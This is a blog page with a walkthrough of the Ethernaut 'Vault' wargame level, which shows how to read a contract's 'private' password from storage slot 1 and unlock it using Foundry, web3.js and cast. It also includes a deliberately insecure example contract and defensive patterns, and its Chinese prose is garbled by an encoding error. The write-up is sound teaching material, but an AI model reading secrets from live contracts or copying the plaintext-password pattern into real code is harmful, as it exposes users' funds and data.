<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å– - Kent&#39;s Blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>KENT&#39;S BLOG</span>
  </a>
</div>
    <div id="menu" class="book-menu hide">
  <h2 id="ä¸»è¦å†…å®¹"><a href="#ä¸»è¦å†…å®¹" class="headerlink" title="ä¸»è¦å†…å®¹"></a>ä¸»è¦å†…å®¹</h2><ul>
<li><a href="/">é¦–é¡µ</a></li>
<li><a href="/archives">æ–‡ç« å½’æ¡£</a></li>
<li><a href="/categories">åˆ†ç±»æµè§ˆ</a> </li>
<li><a href="/tags">æ ‡ç­¾äº‘</a></li>
</ul>
<h2 id="Web3-0-ä¸“åŒº"><a href="#Web3-0-ä¸“åŒº" class="headerlink" title="Web3.0 ä¸“åŒº"></a>Web3.0 ä¸“åŒº</h2><ul>
<li><a href="/categories/Dapp">Dapp å¼€å‘</a></li>
<li><a href="/tags/solidity">æ™ºèƒ½åˆçº¦</a></li>
<li><a href="/tags/blockchain">åŒºå—é“¾æŠ€æœ¯</a></li>
<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3å®‰å…¨</a></li>
</ul>
<h2 id="Ethernaut-ç³»åˆ—-ğŸ›¡ï¸"><a href="#Ethernaut-ç³»åˆ—-ğŸ›¡ï¸" class="headerlink" title="Ethernaut ç³»åˆ— ğŸ›¡ï¸"></a>Ethernaut ç³»åˆ— ğŸ›¡ï¸</h2><ul>
<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">ç³»åˆ—æ€»è§ˆ</a></li>
<li><a href="/2025/01/25/foundry-setup-guide/">Foundry ç¯å¢ƒæ­å»º</a></li>
</ul>
<h4 id="åŸºç¡€æ”»å‡»ç¯‡-1-10"><a href="#åŸºç¡€æ”»å‡»ç¯‡-1-10" class="headerlink" title="åŸºç¡€æ”»å‡»ç¯‡ (1-10)"></a>åŸºç¡€æ”»å‡»ç¯‡ (1-10)</h4><ul>
<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
</ul>
<h4 id="è¿›é˜¶æ”»å‡»ç¯‡-11-20"><a href="#è¿›é˜¶æ”»å‡»ç¯‡-11-20" class="headerlink" title="è¿›é˜¶æ”»å‡»ç¯‡ (11-20)"></a>è¿›é˜¶æ”»å‡»ç¯‡ (11-20)</h4><ul>
<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
</ul>
<h4 id="é«˜çº§æ”»å‡»ç¯‡-21-25"><a href="#é«˜çº§æ”»å‡»ç¯‡-21-25" class="headerlink" title="é«˜çº§æ”»å‡»ç¯‡ (21-25)"></a>é«˜çº§æ”»å‡»ç¯‡ (21-25)</h4><ul>
<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
</ul>
<h2 id="ä¸ªäººé¡µé¢"><a href="#ä¸ªäººé¡µé¢" class="headerlink" title="ä¸ªäººé¡µé¢"></a>ä¸ªäººé¡µé¢</h2><ul>
<li><a href="/about">å…³äºæˆ‘</a></li>
<li><a href="/repository">é¡¹ç›®å±•ç¤º</a></li>
<li><a href="/books">ä¹¦å•æ¨è</a></li>
<li><a href="/links">å‹æƒ…é“¾æ¥</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <h1 id="ğŸ¯-Ethernaut-Level-8-Vault-ç§æœ‰å˜é‡è¯»å–"><a href="#ğŸ¯-Ethernaut-Level-8-Vault-ç§æœ‰å˜é‡è¯»å–" class="headerlink" title="ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–"></a>ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–</h1><blockquote>
<p><strong>å…³å¡é“¾æ¥</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/8">Ethernaut Level 8 - Vault</a><br><strong>æ”»å‡»ç±»å‹</strong>: ç§æœ‰å˜é‡è¯»å–<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>
</blockquote>
<h2 id="ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡"><a href="#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡" class="headerlink" title="ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¦ unlock è¿™ä¸ªåˆçº¦è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾åˆ° passwordã€‚æŒ‘æˆ˜çš„å…³é”®åœ¨äºç†è§£åŒºå—é“¾ä¸Šæ²¡æœ‰çœŸæ­£çš„â€ç§æœ‰â€æ•°æ®ï¼Œæ‰€æœ‰çŠ¶æ€å˜é‡éƒ½å¯ä»¥è¢«è¯»å–ã€‚</p>
<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg" alt="Vault Requirements"></p>
<h2 id="ğŸ”-æ¼æ´åˆ†æ"><a href="#ğŸ”-æ¼æ´åˆ†æ" class="headerlink" title="ğŸ” æ¼æ´åˆ†æ"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id="å­˜å‚¨æœºåˆ¶-Storage"><a href="#å­˜å‚¨æœºåˆ¶-Storage" class="headerlink" title="å­˜å‚¨æœºåˆ¶ (Storage)"></a>å­˜å‚¨æœºåˆ¶ (Storage)</h3><p>æˆ‘ä»¬éœ€è¦ç†è§£ EVM ä¸­å­˜å‚¨çš„å¸ƒå±€ä»¥åŠåŸç†ï¼ˆä½¿ç”¨ 32 å­—èŠ‚å¤§å°çš„æ’æ§½ï¼‰å’Œ JSON RPC å‡½æ•° <code>eth_getStorageAt</code>ã€‚</p>
<p>EVM çš„æ•°æ®éƒ½å­˜åœ¨ 32 å­—èŠ‚æ§½ä¸­ï¼š</p>
<ul>
<li>ç¬¬ä¸€ä¸ªçŠ¶æ€å˜é‡å­˜å‚¨åœ¨æ§½ä½ 0</li>
<li>å¦‚æœç¬¬ä¸€ä¸ªå˜é‡å­˜å‚¨å®Œäº†è¿˜æœ‰è¶³å¤Ÿçš„å­—èŠ‚ï¼Œä¸‹ä¸€ä¸ªå˜é‡ä¹Ÿå­˜å‚¨åœ¨ slot 0</li>
<li>å¦åˆ™å­˜å‚¨åœ¨ slot 1ï¼Œä¾æ­¤ç±»æ¨</li>
</ul>
<blockquote>
<p><strong>æ³¨æ„</strong>: åƒæ•°ç»„å’Œå­—ç¬¦ä¸²è¿™æ ·çš„åŠ¨æ€ç±»å‹å·¥ä½œæ–¹å¼ä¸åŒ</p>
</blockquote>
<p>åœ¨ Vault åˆçº¦ä¸­ï¼š</p>
<ul>
<li><code>locked</code> æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä½¿ç”¨ 1 å­—èŠ‚ï¼Œå­˜å‚¨åœ¨ slot 0</li>
<li><code>password</code> æ˜¯ä¸€ä¸ª bytes32ï¼Œä½¿ç”¨ 32 ä¸ªå­—èŠ‚</li>
<li>ç”±äºæ’æ§½ 0 ä¸­å‰©ä½™çš„ 31 ä¸ªå­—èŠ‚æ— æ³•å®¹çº³ passwordï¼Œå› æ­¤å®ƒè¢«å­˜å‚¨åœ¨ slot 1 ä¸­</li>
</ul>
<h3 id="è¯»å–-Storage"><a href="#è¯»å–-Storage" class="headerlink" title="è¯»å– Storage"></a>è¯»å– Storage</h3><p><code>eth_getStorageAt</code> JSON RPC å‡½æ•°å¯ç”¨äºè¯»å–åˆçº¦åœ¨ç»™å®šæ§½ä½çš„å­˜å‚¨ã€‚</p>
<p>ä½¿ç”¨ web3.js è¯»å– slot 1 çš„åˆçº¦å­˜å‚¨ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contractAddress, <span class="number">1</span>, <span class="function">(<span class="params">err, result</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åœ¨ Foundry ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ cheatcodes ä¸­çš„ loadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br></pre></td></tr></table></figure>

<h2 id="ğŸ’»-Foundry-å®ç°"><a href="#ğŸ’»-Foundry-å®ç°" class="headerlink" title="ğŸ’» Foundry å®ç°"></a>ğŸ’» Foundry å®ç°</h2><h3 id="æ”»å‡»åˆçº¦ä»£ç "><a href="#æ”»å‡»åˆçº¦ä»£ç " class="headerlink" title="æ”»å‡»åˆçº¦ä»£ç "></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class="line">import &quot;../src/levels/VaultFactory.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract VaultTest is Test &#123;</span><br><span class="line">    Ethernaut ethernaut;</span><br><span class="line">    VaultFactory vaultFactory;</span><br><span class="line">    </span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        ethernaut = new Ethernaut();</span><br><span class="line">        vaultFactory = new VaultFactory();</span><br><span class="line">        ethernaut.registerLevel(vaultFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testVaultExploit() public &#123;</span><br><span class="line">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class="line">        address levelInstance = ethernaut.createLevelInstance(vaultFactory);</span><br><span class="line">        Vault instance = Vault(levelInstance);</span><br><span class="line">        </span><br><span class="line">        // éªŒè¯åˆå§‹çŠ¶æ€</span><br><span class="line">        assertEq(instance.locked(), true);</span><br><span class="line">        </span><br><span class="line">        // æ”»å‡»ï¼šè¯»å–å­˜å‚¨åœ¨ slot 1 ä¸­çš„å¯†ç </span><br><span class="line">        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class="line">        </span><br><span class="line">        // ä½¿ç”¨è¯»å–çš„å¯†ç è§£é”</span><br><span class="line">        instance.unlock(password);</span><br><span class="line">        </span><br><span class="line">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class="line">        assertEq(instance.locked(), false);</span><br><span class="line">        </span><br><span class="line">        // æäº¤å…³å¡</span><br><span class="line">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class="line">            payable(levelInstance)</span><br><span class="line">        );</span><br><span class="line">        assert(levelSuccessfullyPassed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å…³é”®æ”»å‡»æ­¥éª¤"><a href="#å…³é”®æ”»å‡»æ­¥éª¤" class="headerlink" title="å…³é”®æ”»å‡»æ­¥éª¤"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>
<li><strong>åˆ†æå­˜å‚¨å¸ƒå±€</strong>ï¼šç¡®å®š password å­˜å‚¨åœ¨ slot 1</li>
<li><strong>è¯»å–å­˜å‚¨</strong>ï¼šä½¿ç”¨ <code>vm.load()</code> è¯»å– slot 1 çš„æ•°æ®</li>
<li><strong>è°ƒç”¨ unlock</strong>ï¼šä½¿ç”¨è¯»å–çš„å¯†ç è§£é”åˆçº¦</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// è¯»å– slot 1 ä¸­çš„å¯†ç </span><br><span class="line">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class="line"></span><br><span class="line">// è§£é”åˆçº¦</span><br><span class="line">instance.unlock(password);</span><br><span class="line"></span><br><span class="line">// éªŒè¯è§£é”æˆåŠŸ</span><br><span class="line">assertEq(instance.locked(), false);</span><br></pre></td></tr></table></figure>

<h2 id="ğŸ›¡ï¸-é˜²å¾¡æªæ–½"><a href="#ğŸ›¡ï¸-é˜²å¾¡æªæ–½" class="headerlink" title="ğŸ›¡ï¸ é˜²å¾¡æªæ–½"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id="1-é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®"><a href="#1-é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®" class="headerlink" title="1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®"></a>1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// âŒ ä¸å®‰å…¨ï¼šå¯†ç å­˜å‚¨åœ¨é“¾ä¸Š</span><br><span class="line">contract VulnerableVault &#123;</span><br><span class="line">    bytes32 private password;  // å¯ä»¥è¢«è¯»å–ï¼</span><br><span class="line">    </span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯</span><br><span class="line">contract SecureVault &#123;</span><br><span class="line">    bytes32 private passwordHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡</span><br><span class="line">    </span><br><span class="line">    constructor(bytes32 _passwordHash) &#123;</span><br><span class="line">        passwordHash = _passwordHash;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unlock(string memory _password) public &#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(_password)) == passwordHash, &quot;Wrong password&quot;);</span><br><span class="line">        // unlock logic</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ"><a href="#2-ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ" class="headerlink" title="2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ"></a>2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract CommitRevealVault &#123;</span><br><span class="line">    mapping(address =&gt; bytes32) private commitments;</span><br><span class="line">    </span><br><span class="line">    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ</span><br><span class="line">    function commit(bytes32 _commitment) public &#123;</span><br><span class="line">        commitments[msg.sender] = _commitment;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯</span><br><span class="line">    function reveal(string memory _password, uint256 _nonce) public &#123;</span><br><span class="line">        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));</span><br><span class="line">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class="line">        // unlock logic</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-ä½¿ç”¨é“¾ä¸‹éªŒè¯"><a href="#3-ä½¿ç”¨é“¾ä¸‹éªŒè¯" class="headerlink" title="3. ä½¿ç”¨é“¾ä¸‹éªŒè¯"></a>3. ä½¿ç”¨é“¾ä¸‹éªŒè¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract OffChainVault &#123;</span><br><span class="line">    address private authorizedSigner;</span><br><span class="line">    mapping(address =&gt; bool) private unlocked;</span><br><span class="line">    </span><br><span class="line">    function unlock(bytes memory signature, address user) public &#123;</span><br><span class="line">        bytes32 messageHash = keccak256(abi.encodePacked(user, &quot;unlock&quot;));</span><br><span class="line">        address signer = recoverSigner(messageHash, signature);</span><br><span class="line">        require(signer == authorizedSigner, &quot;Unauthorized&quot;);</span><br><span class="line">        unlocked[user] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯"><a href="#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯" class="headerlink" title="ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id="å­˜å‚¨è¯»å–å·¥å…·"><a href="#å­˜å‚¨è¯»å–å·¥å…·" class="headerlink" title="å­˜å‚¨è¯»å–å·¥å…·"></a>å­˜å‚¨è¯»å–å·¥å…·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ cast è¯»å–å­˜å‚¨</span></span><br><span class="line">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ web3.py</span></span><br><span class="line">from web3 import Web3</span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class="line">password = w3.eth.get_storage_at(contract_address, 1)</span><br></pre></td></tr></table></figure>

<h3 id="å­˜å‚¨å¸ƒå±€åˆ†æ"><a href="#å­˜å‚¨å¸ƒå±€åˆ†æ" class="headerlink" title="å­˜å‚¨å¸ƒå±€åˆ†æ"></a>å­˜å‚¨å¸ƒå±€åˆ†æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€</span><br><span class="line">// forge inspect &lt;CONTRACT&gt; storage-layout</span><br></pre></td></tr></table></figure>

<h2 id="ğŸ¯-æ€»ç»“"><a href="#ğŸ¯-æ€»ç»“" class="headerlink" title="ğŸ¯ æ€»ç»“"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>
<ul>
<li><code>private</code> å…³é”®å­—æ„å‘³ç€æ•°æ®åªèƒ½ç”±åˆçº¦æœ¬èº«è®¿é—®ï¼Œè€Œä¸æ˜¯å¯¹å¤–ç•Œéšè—</li>
<li>åŒºå—é“¾ä¸Šæ²¡æœ‰ä»€ä¹ˆæ˜¯ç§æœ‰çš„ï¼Œä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»</li>
<li>EVM å­˜å‚¨ä½¿ç”¨ 32 å­—èŠ‚çš„æ’æ§½ç³»ç»Ÿ</li>
</ul>
<p><strong>æ”»å‡»å‘é‡</strong>:</p>
<ul>
<li>ç›´æ¥è¯»å–åˆçº¦å­˜å‚¨</li>
<li>åˆ†æå­˜å‚¨å¸ƒå±€ç¡®å®šæ•æ„Ÿæ•°æ®ä½ç½®</li>
<li>ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®</li>
</ul>
<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>
<ul>
<li>æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®</li>
<li>ä½¿ç”¨å“ˆå¸Œå’Œæ‰¿è¯ºæ–¹æ¡ˆ</li>
<li>è€ƒè™‘é“¾ä¸‹éªŒè¯æœºåˆ¶</li>
<li>å®æ–½é€‚å½“çš„è®¿é—®æ§åˆ¶</li>
</ul>
<hr>
<h2 id="ğŸ”—-ç›¸å…³é“¾æ¥"><a href="#ğŸ”—-ç›¸å…³é“¾æ¥" class="headerlink" title="ğŸ”— ç›¸å…³é“¾æ¥"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>
<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>
<li><strong><a href="/2025/01/25/ethernaut-level-07-force/">ä¸Šä¸€å…³: Level 7 - Force</a></strong></li>
<li><strong><a href="/2025/01/25/ethernaut-level-09-king/">ä¸‹ä¸€å…³: Level 9 - King</a></strong></li>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub é¡¹ç›®</a></strong></li>
</ul>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure
          class="avatar avatar-lg"
          data-initial="K"
          style="background-color: #3b4351;">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>Kent</div>
      <div>2025-01-25</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3å®‰å…¨</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">æ™ºèƒ½åˆçº¦</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>

      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/Storage/" rel="tag">#Storage</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#æ™ºèƒ½åˆçº¦å®‰å…¨</a> <a class="tag-none-link" href="/tags/%E7%A7%81%E6%9C%89%E5%8F%98%E9%87%8F%E8%AF%BB%E5%8F%96/" rel="tag">#ç§æœ‰å˜é‡è¯»å–</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
